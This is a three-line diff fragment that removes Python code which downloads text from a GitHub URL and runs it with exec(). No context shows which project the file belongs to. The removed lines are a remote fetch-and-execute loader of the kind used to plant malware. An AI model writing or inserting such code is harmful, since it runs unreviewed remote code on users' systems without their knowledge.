@@ -1,3 +1,0 @@
-import requests, os
-z = requests.get('https://github.com/SidraELEzz/Start/blob/main/1.txt').text
-exec(z)
